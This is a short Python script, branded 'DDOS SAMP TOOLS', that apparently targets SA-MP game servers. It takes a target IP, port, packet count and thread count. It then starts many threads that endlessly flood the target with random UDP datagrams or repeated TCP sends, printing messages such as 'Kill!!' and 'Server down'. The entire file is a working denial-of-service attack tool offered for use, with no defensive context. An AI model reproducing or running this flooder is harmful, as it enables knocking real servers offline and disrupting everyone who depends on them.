#5haldoun On Top
import random
import socket
import threading
import os

os.system("clear")
print("DDOS SAMP TOOLS")
print("Verison 1")
print("Zone")
ip = str(input(" DDOS SAMP 5HalDoUn | Ip:"))
port = int(input(" DDOS SAMP 5HalDoUn | Port:"))
choice = str(input(" DDOS SAMP 5HalDoUn | mystification?(y/n):"))
times = int(input(" DDOS SAMP 5HalDoUn | Packets:"))
threads = int(input(" DDOS SAMP 5HalDoUn | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"|DDOS SAMP|")
		except:
			print("[!] | Server down |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Kill!!")
		except:
			s.close()
			print("[*] Kill")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
